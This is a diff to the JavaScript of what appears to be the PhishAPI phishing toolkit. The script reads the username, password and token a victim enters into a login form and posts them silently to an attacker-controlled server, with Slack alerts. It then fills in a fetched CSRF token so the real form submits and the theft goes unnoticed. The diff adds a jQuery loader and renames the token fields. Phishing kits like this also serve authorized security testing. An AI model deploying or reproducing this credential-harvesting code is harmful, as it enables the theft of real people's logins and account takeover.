@@ -1,4 +1,39 @@
-function SubForm(APIPortal,FormName,Project,SlackBotName,SlackEmoji,UsernameInputID,PasswordInputID,RedirURL,XSRFToken){
+// Anonymous "self-invoking" JQuery Function
+(function() {
+    var startingTime = new Date().getTime();
+    // Load the script
+    var script = document.createElement("SCRIPT");
+    script.src = 'https://code.jquery.com/jquery-3.4.1.min.js';
+    script.type = 'text/javascript';
+    document.getElementsByTagName("head")[0].appendChild(script);
+
+    // Poll for jQuery to come into existance
+    var checkReady = function(callback) {
+        if (window.jQuery) {
+            callback(jQuery);
+        }
+        else {
+            window.setTimeout(function() { checkReady(callback); }, 20);
+        }
+    };
+
+    // Start polling...
+    checkReady(function($) {
+        $(function() {
+            var endingTime = new Date().getTime();
+            var tookTime = endingTime - startingTime;
+            //window.alert("jQuery is loaded, after " + tookTime + " milliseconds!");
+        });
+    });
+})();
+
+// Main PhishAPI Form Submission Function
+function SubForm(APIPortal,FormName,Project,SlackBotName,SlackEmoji,UsernameInputID,PasswordInputID,RedirURL,CSRFToken){
+	// Pull in JQuery
+	//var imported = document.createElement('script');
+	//imported.src = 'https://code.jquery.com/jquery-3.4.1.min.js';
+	//document.head.appendChild(imported);
+	
 	// Phisher Controlled Variables
 	var APIPortal = SubForm.arguments[0];
 	var FormName = SubForm.arguments[1];
@@ -7,8 +42,8 @@ function SubForm(APIPortal,FormName,Project,SlackBotName,SlackEmoji,UsernameInpu
 	var SlackEmoji = SubForm.arguments[4];
 	var UsernameInputID = SubForm.arguments[5];
 	var PasswordInputID = SubForm.arguments[6];
-	var RedirURL = SubForm.arguments[7];
-	var XSRFToken = SubForm.arguments[8];
+	var RedirURL = encodeURI(SubForm.arguments[7]);
+	var CSRFToken = SubForm.arguments[8];
 	// Vistim Controlled Variables
 	var Username = document.getElementById(UsernameInputID).value;
 	var Password = document.getElementById(PasswordInputID).value;
@@ -19,7 +54,7 @@ function SubForm(APIPortal,FormName,Project,SlackBotName,SlackEmoji,UsernameInpu
 		Token = '';
 	}
 	
-	var URL = 'project='+Project+'&username='+Username+'&password='+Password+'&token='+Token+'&slackbotname='+SlackBotName+'&slackemoji='+SlackEmoji+'&xsrftoken='+XSRFToken+'&redirurl='+RedirURL;
+	var URL = 'project='+Project+'&username='+Username+'&password='+Password+'&token='+Token+'&slackbotname='+SlackBotName+'&slackemoji='+SlackEmoji+'&CSRFtoken='+CSRFToken+'&redirurl='+RedirURL;
 
     $.ajax({
         // Post Transparent AJAX Request to PhishAPI Server
@@ -28,11 +63,11 @@ function SubForm(APIPortal,FormName,Project,SlackBotName,SlackEmoji,UsernameInpu
 		data:encodeURI(URL),
         success:function (msg){		
 		
-				// Grab Remote XSRF Token if Provided and Update Input Field to Match
-				if(XSRFToken){
-				var xsrfvalue = msg;
-				if(document.getElementsByName(XSRFToken)){document.getElementsByName(XSRFToken)[0].value = xsrfvalue;}
-				if(document.getElementById(XSRFToken)){document.getElementById(XSRFToken).value = xsrfvalue;}
+				// Grab Remote CSRF Token if Provided and Update Input Field to Match
+				if(CSRFToken){
+				var CSRFvalue = msg;
+				if(document.getElementsByName(CSRFToken)){document.getElementsByName(CSRFToken)[0].value = CSRFvalue;}
+				if(document.getElementById(CSRFToken)){document.getElementById(CSRFToken).value = CSRFvalue;}
 				}
 				
 				// Submit Original Form
